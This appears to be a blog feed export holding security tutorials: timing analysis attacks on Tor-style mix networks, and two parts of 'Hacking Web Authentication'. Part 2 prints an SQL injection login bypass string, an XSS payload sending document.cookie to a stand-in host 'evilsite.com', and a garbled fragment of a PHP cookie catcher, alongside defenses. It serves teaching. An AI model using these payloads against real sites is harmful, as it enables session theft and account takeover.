&lt;h2 id=&quot;help-project-meshnet&quot;&gt;Help Project Meshnet&lt;/h2&gt;

&lt;p&gt;The creators of Project Meshnet are always looking for individuals to help in technical as well as non-technical related fields. Go to https://projectmeshnet.org/ to find out more.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Project Meshnet&lt;br /&gt;
&lt;a href=&quot;https://projectmeshnet.org/&quot;&gt;https://projectmeshnet.org/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;MeshWiki&lt;br /&gt;
&lt;a href=&quot;https://wiki.projectmeshnet.org/Main_Page&quot;&gt;https://wiki.projectmeshnet.org/Main_Page&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Mesh Networking&lt;br /&gt;
&lt;a href=&quot;http://en.wikipedia.org/wiki/Mesh_networking&quot;&gt;http://en.wikipedia.org/wiki/Mesh_networking&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Timing Analysis Attacks in Anonymous Systems</title>
   <link href="https://bitbrain.github.io/2013/06/12/timing-analysis-attacks-in-anonymous-systems.html"/>
   <updated>2013-06-12T05:32:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/12/timing-analysis-attacks-in-anonymous-systems</id>
   <content type="html">&lt;p&gt;Anonymous systems are used to allow users to surf the web, communicate with servers anonymously. Some of the popular Anonymity service providers are TOR, GTunnel etc. The basic idea is to hide the identity of the user. However it is important to ensure that the efficiency of the anonymous system in not decreased in the process which could depend on numerous factors like latency, degree of anonymity etc. The communication between the sender and the receiver happens through a set of routers, often referred to as a mix or node, whose job is to hide the relation between the incoming and the outgoing packets through it by using various techniques like using encryption, adding delays, adding cover traffic etc.&lt;!--more--&gt; In Timing analysis attacks we assume that the attacker has access to a particular set of mixes, i.e the attacker is a part of the network. By studying the timing of the messages going through the mixes, it is possible for him to determine the mixes that form a communication path. If the first and last mixes in the network are owned by the attacker, then it is possible for him to figure out the identities of the sender and the receiver. Some of the anonymous systems use a technique known as constant rate cover traffic, in which some extra cover traffic is sent along with the normal traffic so that it appears that the messages are sent at a constant rate through each path, thereby making it difficult for the attacker to find any correlation between the messages. In the past few years, many attacks and defenses have been proposed against Timing analysis attacks, some of which we will be discussing in this article.&lt;/p&gt;

&lt;h2 id=&quot;anonymous-systems&quot;&gt;Anonymous systems&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;a) TOR&lt;/strong&gt; -Tor is a software that provides online anonymity to the users by not revealing their identity. The communication between the sender (client) and the receiver (destination) happens through a bunch of Tor nodes that form together a network. These nodes are actually the systems of the various users around the world running TOR who opt to be a part of the network. When a user wants to visit a particular website, TOR chooses a random path which goes through these nodes and finally to the destination. Note that the traffic between these nodes is encrypted and follows the Onion routing protocol. In Onion routing, a message is encrypted a number of times and then sent to the network containing the nodes. In each node the message is decrypted once through which it receives further routing instructions and hence moves over to the next node. This process is similar to peeling an onion layer by layer, and hence the name Onion Routing. This ensures that each node does not know about the sender and the receiver. Also it becomes difficult for an attacker performing traffic analysis on the network to figure out the identity of the sender and the receiver.&lt;/p&gt;

&lt;p&gt;Tor can be downloaded from &lt;a href=&quot;https://www.torproject.org/download/download.html.en&quot;&gt;here&lt;/a&gt;. The following figure shows TOR running on my system using &lt;em&gt;Vidalia&lt;/em&gt;. Vidalia is a kind of GUI for TOR. It lets us perform various operations like Start/Stop Tor, View the Network of users which form a part of the TOR network, Setup relaying and so on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/timing/img1.png&quot; alt=&quot;Img1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also set up our system to be a part of the TOR network.You can find more information about that &lt;a href=&quot;https://www.torproject.org/docs/tor-doc-relay.html.en&quot;&gt;here&lt;/a&gt;.Click on &lt;em&gt;View the Network&lt;/em&gt; to see the number of systems acting as relays for the TOR network.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/timing/img2.png&quot; alt=&quot;Img2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that it is possible to run your system as a middle relay or an exit relay. The exit relay is the last relay through which the traffic on a certain communication path passes through before reaching the final destination. There can be many exit nodes on the whole network. In case an illegal activity is performed by someone using TOR, the exit relay could be blamed for that because the IP address of the exit relay will appear to be the source address in the logs of the victim. Hence people who want to run exit relays should be aware of these kind of things.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;b) GTunnel&lt;/strong&gt; - GTunnel is another anonymity system for Windows released by Garden Networks in 2007. It works as a local HTTP proxy and SOCKS proxy. When we use this proxy for our browser, the traffic is directed through the GTunnel servers before reaching the original destination in the standard mode. There are other modes too in which we can use GTunnel, for example the &lt;em&gt;Skype Mode&lt;/em&gt;, in which GTunnel first connects through the Peer to Peer network of Skype and then to the GTunnel servers, as well as the &lt;em&gt;Tor mode&lt;/em&gt;, in which Gtunnel connects through Tor nodes to the GTunnel servers and then to the final destination. Note that the traffic is encrypted throughout the communication path.&lt;/p&gt;

&lt;h2 id=&quot;timing-analysis-attacks&quot;&gt;Timing Analysis attacks&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;a) Watermarking&lt;/strong&gt; - In this technique, the attacker actively injects the message in a flow with a specific pattern. If the pattern is then observed in some other flow in the output stream of a mix, then it can be assumed that the two flows have a common path. This technique has proven to be quite successful against anonymous systems. One of the other advantages of Watermarking is that it is not very computationally expensive to perform.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;b) Flow Correlation attack&lt;/strong&gt; - If successfully perfomed, this attack can allow the attacker to identify the path of the flow and even reveal the identity of the sender and the receiver. The idea is to analyze one particular mix, see all the traffic that it is receiving at a particular port, and then find which output ports on the same mix is carrying the traffic corresponding to the traffic at the input port. This can be achieved by noting the similarity between the traffic at the input and the output port, which could be based on the timing of the packets, packet size etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;c) Selective Cross Correlation attack&lt;/strong&gt; - This attack is a bit more effective than the Correlation attack. Some of the mixes add some dummy traffic (also called cover traffic) to prevent from timing analysis attacks. In Selective Cross Correlation attack, we assume the incoming and outgoing traffic as two streams, and divide both these streams into non-overlapping windows. We then try to compare the packets in the incoming window in the input stream with the corresponding packets in the outgoing window in the output stream. In case the traffic in the outgoing window is more than the incoming window, then we can clearly say that some dummy traffic has been added in this case. We then remove all the windows in which we think cover traffic has been used from our test case and perform cross correlation on the other windows only thereby giving us a better result.&lt;/p&gt;

&lt;h2 id=&quot;defenses-against-timing-analysis-attacks&quot;&gt;Defenses Against Timing Analysis Attacks&lt;/h2&gt;

&lt;p&gt;To counter the threat of Timing analysis attacks , a number of defenses and algorithms have been proposed in the last few years. The solution is to choose a tradeoff between the best defense and the various factors which affect the efficiency of an anonymity system such as Latency, Bandwidth and anonymity. Also the topology of the network is an important consideration in this case. In this section we will go through the various defenses that have been proposed against timing analysis attacks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;a) Adaptive Padding&lt;/strong&gt; - In case of adaptive padding, arbitrary packets are inserted into the stream by the mixes in between in order to destroy the results for timing analysis attacks. This prevents the attacker from linking the incoming and outgoing streams to a certain extent. Padding ratio is a term used to signify the no of dummy packets used per original packet. For e.g if the padding ratio is 0.5, then it means that there is 1 dummy packet for every 2 real packets. Adaptive padding works pretty well against passive timing analysis attacks. It can also work well with active timing analysis attacks, in which specific patterns are added in streams in order to fingerprint them for later use, but with a little compromise of a certain increase in the latency.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;b) Defensive Dropping&lt;/strong&gt; - In Defensive Dropping the sender sends the message with some dummy packets and the intermediate mixes are instructed to drop those packets. If this process is repeated several times for different streams, then it reduces the correlation between the incoming and outgoing streams and hence the probability of an attacker figuring out the path of the flow. These packets are randomly selected to be dropped. Note that no one mix is instructed to drop the packets, rather a number of intermediate mixes are instructed to drop the packets.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;c) Gamma Buffering&lt;/strong&gt; - This technique involves buffering some packets before passing them over from one mix to another. For e.g if the number of incoming connections to a node is p and the value of Gamma is γ, then according to the algorithm, the node must buffer a total of γ&lt;em&gt;p no of packets before passing them through. However some of the disadvantages of Gamma Buffering is that it could lead to additional delays. For e.g the required number of packets (γ&lt;/em&gt;p) may arrive earlier in a stream than the other. Hence there would be an extra delay in the stream receiving lesser number of packets which could increase further as the packets flow through other nodes. This problem will not occur on high traffic networks though. These variable delays will destroy many of the timing characteristics and watermarks that an attacker must have injected and will be looking for in the outgoing streams.&lt;/p&gt;

&lt;h2 id=&quot;testing&quot;&gt;Testing&lt;/h2&gt;

&lt;p&gt;These kind of attacks can be tested by setting up a private TOR network. It is always a challenging task to test these attacks mainly because they involve us to control a lot of systems at once. &lt;a href=&quot;http://www.planet-lab.org/&quot;&gt;Planetlab&lt;/a&gt; and &lt;a href=&quot;http://www.isi.deterlab.net/index.php3&quot;&gt;Deterlab&lt;/a&gt; make this very easy for us. Planetlab consists of a group of computers contributed from different sites across the world to serve as a testbed for performing experiments that involve a large number of nodes. Different universities and corporations across the world provide their own systems to be used for performing experiments, development and research. Access is not provided to all users but only to those members who are a part of an institution that is a member of the PlanetLab Consortium. Every institution which is a part of Planetlab has a Principal Investigator that should approve accounts for the members of their own institution. Deterlab is another testbed for conducting network security related experiments. To have access to Deterlab the head of the project must register for a new project on Deterlab’s website. Different projects could be run on the same nodes without affecting each other. We can also set up the topology of the /images/posts/dns/ in Deterlab.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Anonymous systems help users surf the web anonymously. Some of the popular anonymous systems are TOR, Gtunnel etc. Anonymous systems can be attacked through various ways to reveal the identity of the user. In this article we discussed about the way some of the anonymous systems work and also discussed a set of attacks called Timing Analysis through which by looking at the timing of the messages flowing through the intermediate servers, it is possible for an attacker to compromise the identity of the user and figure out the path the user is using to connect to the web.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Timing Attacks in Low-Latency Mix Systems&lt;br /&gt;
&lt;a href=&quot;http://www.cs.umass.edu/~mwright/papers/levine-timing.pdf&quot;&gt;http://www.cs.umass.edu/~mwright/papers/levine-timing.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Selective Cross Correlation in Passive Timing Analysis Attacks against Low-Latency Mixes&lt;br /&gt;
&lt;a href=&quot;http://isec.uta.edu/mwright/papers/scc.pdf&quot;&gt;http://isec.uta.edu/mwright/papers/scc.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Timing analysis in low-latency mix networks: attacks and defenses&lt;br /&gt;
&lt;a href=&quot;http://www.cs.utexas.edu/~shmat/shmat_esorics06.ps&quot;&gt;www.cs.utexas.edu/~shmat/shmat_esorics06.ps&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Studying Timing Analysis on the Internet with SubRosa&lt;br /&gt;
&lt;a href=&quot;http://isec.uta.edu/mwright/papers/daginawala.pdf&quot;&gt;http://isec.uta.edu/mwright/papers/daginawala.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Tor: The Second-Generation Onion Router&lt;br /&gt;
&lt;a href=&quot;https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf&quot;&gt;https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Preventing Active Timing Attacks in Low-Latency Anonymous Communication&lt;br /&gt;
&lt;a href=&quot;http://www.cs.yale.edu/homes/jf/FJS-PETS2010.pdf&quot;&gt;http://www.cs.yale.edu/homes/jf/FJS-PETS2010.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;DeterLab&lt;br /&gt;
&lt;a href=&quot;http://www.isi.deterlab.net/index.php3&quot;&gt;http://www.isi.deterlab.net/index.php3&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PlanetLab&lt;br /&gt;
&lt;a href=&quot;http://www.planet-lab.org/&quot;&gt;http://www.planet-lab.org/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Anonymity Analysis of Mix Networks Against Flow-Correlation Attacks&lt;br /&gt;
&lt;a href=&quot;http://www.cs.tamu.edu/academics/tr/tamu-cs-tr-2005-2-1&quot;&gt;http://www.cs.tamu.edu/academics/tr/tamu-cs-tr-2005-2-1&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Hacking Web Authentication – Part 2</title>
   <link href="https://bitbrain.github.io/2013/06/12/hacking-web-authentication-part-2.html"/>
   <updated>2013-06-12T05:03:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/12/hacking-web-authentication-part-2</id>
   <content type="html">&lt;p&gt;&lt;a href=&quot;http://highaltitudehacks.com/blog/2013/06/12/hacking-web-authentication-part-1/&quot;&gt;In the first part of this article&lt;/a&gt; we looked at some of the common authentication types used in Web Applications these days and discussed their pros and cons. In this article we take it one step further and discuss some of the advanced authentication methods used these days. We will also discuss the various techniques for bypassing web based authentication, and discuss the steps needed to avoid such kinds of vulnerabilities. Overall this article will be divided into two sections.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;a-bypassing-authentication&quot;&gt;A) Bypassing Authentication&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;SQL Injection&lt;/li&gt;
  &lt;li&gt;Cookie Stealing&lt;/li&gt;
  &lt;li&gt;Session Hijacking&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;b-advanced-authentication-methods&quot;&gt;B) Advanced Authentication Methods&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Certificate Based Authentication&lt;/li&gt;
  &lt;li&gt;Two-Factor Authentication&lt;/li&gt;
  &lt;li&gt;Open ID&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;bypassing-authentication&quot;&gt;Bypassing Authentication&lt;/h2&gt;

&lt;p&gt;Bypassing authentication is one of the most useful techniques as it does not require us to know the user’s credentials in order to access the user’s profile. This technique however does not work with HTML-Basic authentication type because, as we remember from the first part of this article, HTML-Basic requires us to send the username and password with every request.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;a) SQL Injection&lt;/strong&gt;- This technique is valid in cases when the user’s credentials are processed at the backend in an SQL statement. If the user’s input is not validated properly, then the attacker has the capability to inject the SQL statement with malicious queries which will allow him to bypass the authentication.&lt;/p&gt;

&lt;p&gt;Let’s say the SQL statement which is responsible for validating the input sent by the user looks something like this. The &lt;em&gt;Username&lt;/em&gt; and &lt;em&gt;Password&lt;/em&gt; are the values of the username and password passed by the user which is then sent to this SQL Statement without input validation.&lt;/p&gt;

&lt;pre&gt;SELECT * FROM USER_TABLE WHERE USERNAME = 'Username' and PASSWORD = 'Password';&lt;/pre&gt;

&lt;p&gt;Let’s say the user enters the username as &lt;em&gt;admin’ OR 1=1 –&lt;/em&gt; and the password as &lt;em&gt;blah&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The SQL query will look like this now.&lt;/p&gt;

&lt;pre&gt;SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --' and PASSWORD = 'blah';&lt;/pre&gt;

&lt;p&gt;If we look closely at the SQL statement, the statement will only get executed till the following line as all the other characters are commented out because of the dashes “–”.&lt;/p&gt;

&lt;pre&gt;SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --&lt;/pre&gt;

&lt;p&gt;Hence the SQL statement selects the user admin if a user with the username “admin” is available in its database otherwise it just returns the first user in the database because the BOOL value of the statement evaluates to TRUE. Hence there was no use of any password in this case. Input validation must be done in order to protect from SQL Injection. Note that SQL Injection in itself is a very massive topic and the case discussed in this article in one of the most simplest forms of SQL Injection. Also note that it is not necessary that the credentials are always validated in the backend with a SQL statement, in which case SQL Injection will not work.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;b) Cookie Stealing&lt;/strong&gt;-Cookies are another source of valuable information that is stored on the user’s computer. Cookies can include valuable information about the user, which could be the user/pass in encoded or encrypted format, the session ID value etc. As far as web authentication is concerned, cookies can be a valuable resource in maintaining the state between the user and the website. A good example of this is a web application which sets a cookie on the user’s system once the user logs in successfully. For all the subsequent requests the user doesn’t have to send his credentials now as long as the cookie doesn’t expire. However this could be a security issue. The problem is that in an open unencrypted network, it is very easy to capture the cookie’s of various users using packet sniffing tools like Wireshark etc. Once the attacker has the cookie, he can use that cookie to impersonate the user. To protect the victim from getting compromised because of these risks, there are different flags that can be set on the server side for issuing cookies to the user.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Secure Flag&lt;/strong&gt;- This flag ensures that the cookie is never transmitted over an unencrypted channel and should always be passed from the client to the server over a secure channel (HTTPS). This flag is very useful as it protects the victim from eavesdropping attacks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Http-Only Flag&lt;/strong&gt;- This feature ensures that the Cookie is not accessible from any non-Http Api’s. This prevents the victim from cookie stealing attacks where the attacker can use javascript to directly access the sessions cookies. Note that this method is not completely foolproof but provides a decent level of security and hence should be used whenever needed.&lt;/p&gt;

&lt;p&gt;Note that not all the values in a cookie are related to maintaining the user’s session with the website. Some of them could just be used to monitor the user’s activities or for some other reasons. Let’s do a quick dissection of the cookies set on our system while using Facebook. I will be using the Firefox Add-on &lt;em&gt;Cookie Manager&lt;/em&gt; to view the cookies set by Facebook. It is a very handy add-on for monitoring and changing cookies.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth2//Screen Shot 2012-01-15 at 5.58.25 PM.png&quot; alt=&quot;Screen Shot 2012 01 15 At 5.58.25 PM&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see there are a number of name-value pairs in the cookies stored by facebook on our system. Also, not all of them are related to the user’s session. In my case i modified the cookie value with the name “s” and found out that i was still able to browse through facebook, hence the session was still maintained. But when i modified the cookie value with the name “c_user”, and tried to surf pages across facebook i found out that i was logged out, i.e the session state was broken and i had to reenter my credentials.&lt;/p&gt;

&lt;p&gt;There could be a number of ways for stealing cookies. In this case i will be discussing the technique of stealing cookies by exploiting an XSS vulnerability in the application. As we know that XSS allows us to execute a script on the victim’s browser. Let’s say we execute the following script on the victim machine.&lt;/p&gt;

&lt;xmp&gt;&lt;script&gt;document.location='http://evilsite.com?cookie=&lt;script&gt;document.cookie&lt;/script&gt;'&amp;lt;/script&amp;gt;&lt;/xmp&gt;

&lt;p&gt;What we are doing is accessing the user’s cookie via javascript and passing it to an external website which stores the cookies of the user. Note that in order to access the cookie via Javascript, the HTTP-Only flag should not be set in the Cookie. Once the attacker has the user’s cookies, he can enter the cookie values in his own browser by using tools like “Cookie Manager” etc and hence impersonate the user. Note that this method will work only if the website uses cookies for maintaining the session state between the client and the browser. On the evil site, we could have some php code that will receive the cookie and store it in a file.&lt;/p&gt;

&lt;p&gt;Here is what the code for the Cookie Catcher file looks like.&lt;/p&gt;

&lt;p&gt;``` IP: ‘ .$ip. ‘&lt;br /&gt;
Date and Time: ‘ .$date. ‘&lt;br /&gt;
Referer: ‘.$referer.’&lt;/p&gt;

&lt;p&gt;’); fclose($fp); //Redirect the user to google.com header (“Location: http://www.google.com”); ?&amp;gt; ```&lt;/p&gt;

&lt;p&gt;This type of attack can be prevented by using appropriate flags (Secure and HTTP-only) for cookies whenever needed. Use of encoding should be avoided in cookies as it is trivial to decode the cookies to get back the original value. Instead encryption should be used in cookies which will prevent it from eavesdropping attacks even in an open and unencrypted network.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;c) Session Hijacking&lt;/strong&gt;- In many cases a user who has authenticated successfully to a website is provided with a token value, or a session ID. This ID is used by the user while making subsequent requests to the website. In case the attacker is able to get the session ID, it is possible to impersonate the client depending on the security mechanisms deployed by the website. There are many ways of obtaining this session ID, sometimes the session ID is stored in the cookie and hence could be obtained by using the Cookie Stealing attacks as discussed earlier. In some cases, the session ID is passed as a query parameter, i.e in the URL. If an attacker has control of any proxy in between the client and the website, it is very easy for him to access the url from the logs and thus get the Session ID. In case the range of the Session ID’s is known, it is also possible to brute force the session ID using Burpsuite as we did in part 1 of this article, the only difference now being that the parameter we are changing is the session ID.&lt;/p&gt;

&lt;p&gt;The following screenshot shows the session ID passed in a request to the application DVWA. Using Burpsuite it is possible to brute force with the session ID as the changing parameter. To learn more on how to brute force using Burp, refer to the &lt;a href=&quot;http://resources.infosecinstitute.com/authentication-hacking-pt1/&quot;&gt;Part 1&lt;/a&gt; of this article.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth2//Screen shot 2012-01-16 at 1.17.54 PM.png&quot; alt=&quot;Screen Shot 2012 01 16 At 1.17.54 PM&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are various ways in which the attacker can steal the session of the victim. One of these methods is called a Session Fixation attack. In this attack, the attacker can control the session ID which a user will obtain once the user logs in to a particular website. He can do this by making the user click on a link with a specific session id, for e.g the url could be site.com?session_id=3ejn324n23j423n3 . Once the user logs in, he is given the session id “3ejn324n23j423n3”. The attacker can now simply impersonate the victim by using the same Session ID. Note that this method will only work in cases when only the Session ID parameter is used to authenticate the victim. If some other parameter like the Ip-address, Mac address etc is used to validate the victim too, this method will not work.&lt;/p&gt;

&lt;p&gt;These kind of attacks can be prevented by using session ID’s that are long, complex and are not easily predicatable. Also the session ID’s should have a very large keyspace, which will make brute force attacks less likely to be successful.&lt;/p&gt;

&lt;h2 id=&quot;advanced-authentication-methods&quot;&gt;Advanced Authentication Methods&lt;/h2&gt;

&lt;p&gt;With the increase in security awareness among people over the last few years, a number of new authentication methods have been deployed. In this section, we will be discussing some of the most popular ones.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;a) Two-Factor Authentication&lt;/strong&gt;-A Two factor authentication involves the use of 2 different kinds of evidence to authenticate a person. Please note that these 2 different kinds of evidence should be completely independent of each other. These 2 factors can be defined in terms of &lt;em&gt;“Something you have”&lt;/em&gt; and &lt;em&gt;“Something you know”&lt;/em&gt;. An example of a two-factor authentication is a biometric authentication asking the users to provide their fingerprint and then asking them to enter their password. In this case the password goes under the category “Something you know” whereas the fingerprint goes under the category “Something you have”. In some cases, hardware tokens are provided to the user as a second factor for authentication.However implementation and support for hardware tokens are very costly, and hence most banking companies do not support this. It would be better to atleast give the user an option to choose whether he wants to use two-factor authentication or not and then charge the amount from him in case he wants it.&lt;/p&gt;

&lt;p&gt;However there are other methods for providing two-factor authentication which are not that expensive. Use of One Time passwords is one such example. Some of the service providers ask the user to enter a One Time Password (OTP) each time the user logs in to use their service. This One Time Password is sent either via a text message or a voice call to their mobile phones. Hence the role of hardware tokens is now taken up by the user’s mobile phone.Two-Factor Authentication is still vulnerable to Man in the Middle attacks, where an attacker can set up a malicious website and once the user enters his credentials, a request is made to the actual website via the attacker. If properly executed, the user will never know that he is not at the original site.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;b) Certificate Based Authentication&lt;/strong&gt;-Certificate Based Authentication is one of the most popular authentication methods used these days. It involves the use of a digital certificate to authenticate a user. Users are prompted to install a unique certificate on their system the first time the user uses a service. So when the user browses to that service again, the service will query the user PC for that unique certificate. If the certificate is valid, then the service will grant access to the user. In some cases, certificate based authentication is used with regular password based authentication method to provide a two-factor authentication which adds an extra layer of security. This is because the certificate is something that the user should have and the password is something that the user should know.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;c) Open ID&lt;/strong&gt;- During the last few years, many websites have started delegating the responsibility of authentication to external authentication service providers. An example of this is the Windows Live ID which allows a user to sign onto multiple websites with the same account. However the most popular authentication service provider is Open ID. Once a user has an Open ID account, he can log on to all the websites that supports Open ID authentication using only one username/password combination.Open ID is supported by many popular websites like Google, Yahoo, Facebook, AOL etc. To create an Open ID we must register an account with an Open ID provider. Some of the popular Open ID providers are MyOpenId, Yahoo etc. It is an important to choose a good Open ID provider as they will be the ones managing our credentials.&lt;/p&gt;

&lt;p&gt;One thing to note that here is that only the Open ID provider can see our password and that the Open ID provider is responsible for communicating with the website and asking it to identify us as a valid user. Some security concerns have been raised in the past over the security that Open ID provides. The problem is, if your Open ID username/password is compromised by an attacker, then it can reveal your whole online information. The attacker can then log on to all the websites that you use with your Open ID. Hence the convenience caused by Open ID does come at a cost. More information about Open ID can be found &lt;a href=&quot;http://openid.net/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we looked at some of the advanced authentication techniques used these days, namely Two-Factor Authentication, Certificate Based Authentication and Open ID. We discussed the pros and cons of each of these techniques. We also discussed various methods of Bypassing authentication like SQL Injection, Cookie Stealing and Session Hijacking. No one method of authentication is the best, however using some of the advanced authentication methods will always decrease the chances of our personal information getting compromised.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;OpenID Foundation Website&lt;br /&gt;
&lt;a href=&quot;http://openid.net&quot;&gt;http://openid.net&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Two-Factor Authentication&lt;br /&gt;
&lt;a href=&quot;http://en.wikipedia.org/wiki/Two-factor_authentication&quot;&gt;http://http://en.wikipedia.org/wiki/Two-factor_authentication&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Session Hijacking attack&lt;br /&gt;
&lt;a href=&quot;https://www.owasp.org/index.php/Session_hijacking_attack&quot;&gt;https://www.owasp.org/index.php/Session_hijacking_attack&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;HTTP Cookie&lt;br /&gt;
&lt;a href=&quot;http://en.wikipedia.org/wiki/HTTP_cookie&quot;&gt;http://en.wikipedia.org/wiki/HTTP_cookie&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Public Key Certificate&lt;br /&gt;
&lt;a href=&quot;http://en.wikipedia.org/wiki/Public_key_certificate&quot;&gt;http://en.wikipedia.org/wiki/Public_key_certificate&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Advanced sign-in security for your google account&lt;br /&gt;
&lt;a href=&quot;http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html&quot;&gt;http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Hacking Web Authentication – Part 1</title>
   <link href="https://bitbrain.github.io/2013/06/12/hacking-web-authentication-part-1.html"/>
   <updated>2013-06-12T04:57:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/12/hacking-web-authentication-part-1</id>
   <content type="html">&lt;p&gt;Authentication is the process of validating something as authentic. When a client makes a request to a web server for accessing a resource, sometimes the web server has to verify the user’s identity. For that the user will have to supply some credentials and the web server validates it. All subsequent decisions are then taken on the basis of the credentials supplied by the client. This process is called Authentication. Once the user is authenticated, the web server sets up the appropriate permissions for the user on it’s resources. Whenever the user tries to access a resource, the server will check if the user has appropriate permissions to access the resource or not. This process is called Authorization.In this article we will look at some of the common types of authentication used these days, discuss the vulnerabilities in them, and then move on to some attacks against these authentication types.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Please note that we will be using Burpsuite in this article for analyzing the requests sent through. Burpsuite is available by default in Backtrack. In order to intercept the requests and manipulate them, we must configure our browser to use Burp’s proxy, which is 127.0.0.1:8080 by default. We will also be using Wireshark a bit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, open up Burpsuite, go to Proxy–&amp;gt;Intercept and make sure Intercept is on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//2.png&quot; alt=&quot;2&quot; /&gt; ˜&lt;/p&gt;

